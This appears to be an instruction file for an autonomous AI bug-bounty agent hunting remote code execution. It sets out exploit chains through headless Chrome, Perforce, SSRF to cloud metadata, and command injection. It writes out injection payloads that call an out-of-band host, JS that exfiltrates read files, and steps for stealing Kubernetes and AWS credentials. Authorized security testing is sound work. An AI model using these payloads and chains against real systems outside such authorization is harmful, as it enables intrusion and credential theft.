---
name: rce
description: "Use when testing for RCE, command injection, code execution, file-write-to-execution primitives, vulnerable-component CVEs, or protocol-level attacks."
---

# /rce - Remote Code Execution Hunting

You are assisting **Liodeus (YesWeHack)**, whose RCE reports include headless-Chrome exploitation chains, Perforce protocol abuse for arbitrary file write, and vulnerable-component exploitation. His RCE findings are typically chains: **SSRF → LFI → RCE**, or **file write → DLL hijack → RCE**.

## Autonomous harness

You run headless: only firewalled Bash (`curl`, `httpx`, `katana`, `ffuf`, `dnsx`, `nuclei`, `subfinder`, `jq`, unix) plus Read/Grep/Glob/Write. No browser, no proxy. Every probe is a `curl`/`httpx` call (or a CDP request over HTTP/WebSocket driven from `curl`) you build by hand.

* **OOB canary** is in `$AUTOHUNT_OOB` (may be UNSET). It is the primary proof for blind RCE: a DNS or HTTP callback to the canary from the target proves code/command execution. Confirm hits via `dnsx` / your canary log. **If `$AUTOHUNT_OOB` is unset, blind/OOB RCE becomes a LEAD** — describe the chain, don't claim it proven.
* **Credentials** (when present): JSON file at the path named in `TARGET.md` (`login_url`, `notes`, `accounts[]`). Authenticate with `curl`/`httpx` if the execution surface is behind auth.
* **Rate caps are firewall-ENFORCED.** `nuclei` (CVE templates), `ffuf`, `katana`, `httpx` MUST carry the rate flags from `TARGET.md` (example shape `-rl 8 -t 10`). No mass scanning. No DoS.
* Do not submit reports or push to Discord — the orchestrator does that.

## Core Philosophy

RCE is the holy grail. In bug bounty, you rarely get direct `eval(user_input)`. Instead, RCE comes from **chaining primitives**: a file write becomes RCE via DLL hijack, an SSRF becomes RCE via cloud metadata → instance credentials → deploy pipeline. **Think in chains.**

## RCE Chains (from real reports)

### Chain 1: Headless Chrome → Debug Protocol → File Read → K8s Secrets
When you find HTML-to-PDF or screenshot rendering, you control the rendered HTML — inject JS that does the network work, since you have no live browser of your own:
1. Confirm server-side JS execution: inject `<img src="http://$AUTOHUNT_OOB/exec-confirmed">` or `fetch('http://$AUTOHUNT_OOB/js-fired')` into the rendered HTML — a callback at the canary proves the renderer executed it (LEAD if `$AUTOHUNT_OOB` unset)
2. From the injected JS, `fetch`-scan localhost for the Chrome DevTools port (often 9222, or randomized 30000-50000)
3. Have the injected JS fetch the debug port's `/json` to get the WebSocket URL, then drive CDP from within the page to read local files
4. Exfiltrate read file contents back to `$AUTOHUNT_OOB` via the injected JS (the renderer is your execution context; the canary is your listener)
5. Target `/var/run/secrets/kubernetes.io/serviceaccount/token`; use the K8s service-account token to reach the cluster API

### Chain 2: Perforce Client → Arbitrary File Write → DLL Hijack
When the target uses Perforce for version control:
1. Stand up a malicious Perforce server reachable from the target
2. Coerce the connection (the chain's hardest step — document the realistic vector)
3. Use `client-WriteFile` to write a malicious DLL into the application directory
4. Application loads the DLL on next startup → RCE

**Key:** Check if `P4CLIENTPATH` is set. If not, the Perforce server can write ANYWHERE. In the headless harness, this is usually a documented chain (LEAD) unless you can prove the file write landed.

### Chain 3: Vulnerable Component → Known CVE
Identify component versions and check for known RCE CVEs. Fingerprint with `curl -I` / error pages / JS, then confirm with targeted `nuclei` templates (carry `TARGET.md` rate flags):
* HeadlessChrome/77.0.3844.0 → multiple RCE CVEs
* pdf.js 1.10.97 → CVE-2018-5158 (XSS that enables further chains)
* Old libcurl → protocol smuggling
* OpenSearch with vulnerable Chrome → RCE via reporting plugin
Where a CVE has an OOB check, point it at `$AUTOHUNT_OOB` for a clean proof.

### Chain 4: SSRF → Cloud Metadata → Deploy Key → Code Push
1. SSRF (via `curl`) to `169.254.169.254/latest/meta-data/iam/security-credentials/`
2. Extract AWS credentials
3. List accessible services (S3, CodeCommit, ECR) — identity verification only
4. Push malicious code or container → RCE in deployment (describe the push step; do not actually deploy)

### Chain 5: Command injection (direct)
1. User input flowing into a system call: filenames, archive names, URLs passed to shell tools, `ping`/`nslookup`-style features, export/convert features
2. Probe with separators around an OOB callback: `;curl http://$AUTOHUNT_OOB/ci`, `$(curl http://$AUTOHUNT_OOB/ci)`, `` `curl http://$AUTOHUNT_OOB/ci` ``, `|nslookup $AUTOHUNT_OOB`
3. A callback at the canary proves injection. If output is reflected, use an in-band marker instead (see PROOF).

## Discovery Methodology

### Step 1: Identify Code Execution Surfaces
Crawl with `katana` (carry `TARGET.md` rate flags) and mine JS for:
* PDF generators (wkhtmltopdf, headless Chrome, Puppeteer)
* Image processors (ImageMagick, GraphicsMagick)
* Document converters (LibreOffice, Pandoc)
* Template engines (Jinja2, ERB, Handlebars)
* Import/export features using external tools
* Version control integrations (Git, SVN, Perforce)
* CI/CD pipelines accessible via API

### Step 2: Version Fingerprinting
For every component you identify:
* Extract the exact version from headers (`curl -I`), error messages, or behavior
* Check CVE databases for that version; run matching `nuclei` templates within rate caps
* Look at the User-Agent of server-side HTTP clients (capture it by pointing a fetch feature at `$AUTOHUNT_OOB`)
* In a headless browser, read `navigator.userAgent` via injected JS and exfil to `$AUTOHUNT_OOB`

### Step 3: Primitive Hunting
Look for primitives that chain to RCE:
* **File write**: upload features, Perforce, import tools
* **File read**: SSRF, LFI, directory traversal
* **JS execution**: injected JS in a headless browser context, template injection
* **Command injection**: user input in system calls, filename handling
* **Deserialization**: Java/PHP/Python/Ruby object deserialization

### Step 4: Chain the Primitives
Map your primitives to known escalation paths:
```
File Write → DLL hijack, webshell, cron job, authorized_keys
File Read → secrets, tokens, source code → auth bypass → more access
JS Execution (headless) → Chrome debug protocol → file read → K8s secrets
SSRF → cloud metadata → credentials → lateral movement
Template Injection → code execution in server-side template engine
```

## PROOF — execution marker or OOB callback (else LEAD)

Theory is not proof. RCE is confirmed only by one of:

1. **In-band marker** — your command output appears in the response. Use a unique, attacker-chosen marker so it can't be a coincidence: `id`, `whoami`, `hostname`, or `echo <random-nonce>`. Example: inject `;echo RCE_$(id)_a1b2c3` and confirm `RCE_uid=...` with your nonce comes back in the `curl` response.
2. **OOB callback** — a DNS or HTTP hit on `$AUTOHUNT_OOB` triggered by the target (e.g. `;curl http://$AUTOHUNT_OOB/$(whoami)` — the requested subpath/hostname carries the command output). Confirm the callback in your canary log / via `dnsx`. This is the proof for blind/no-output execution.
3. If `$AUTOHUNT_OOB` is unset **and** there's no in-band output → **LEAD**: document the injection point, the evidence it reaches an executor, and the chain — do not claim RCE.

For file-write-to-RCE and protocol chains where you cannot safely execute, prove the **write/read primitive** (e.g. read a known file via the read primitive and show its contents; show the write landed by reading it back) and explain the remaining RCE path. Run only non-destructive commands (`id`/`whoami`/`hostname`/`echo`) — never destructive payloads, never DoS.

## Impact Demonstration

For RCE, demonstrate:
1. **Command execution proof**: `id` / `whoami` / `hostname` output in-band, OR a `$AUTOHUNT_OOB` callback carrying that output
2. **Or file-read proof**: contents of one sensitive file (token, config) — one record, not a dump
3. **Environment context**: container? (`cat /proc/1/cgroup`, presence of `/var/run/secrets/...`) which services are reachable?
4. **Blast radius**: one pod? the whole cluster? all customer data?
Capture proof to files (`> proof_rce_*.txt`) so the orchestrator can reproduce.

## Key Considerations
* Always check if you're in a container (Docker/K8s) — K8s secrets are at known paths
* Check for service mesh / sidecar proxies that might give access to other services
* Look for IAM roles / service accounts attached to the compute instance
* Document the full chain clearly — reviewers need to understand each step
* Stay within `TARGET.md` rate caps; no DoS, no destructive commands, no mass scanning
* No `$AUTOHUNT_OOB` and no in-band output → it's a LEAD, not a confirmed RCE
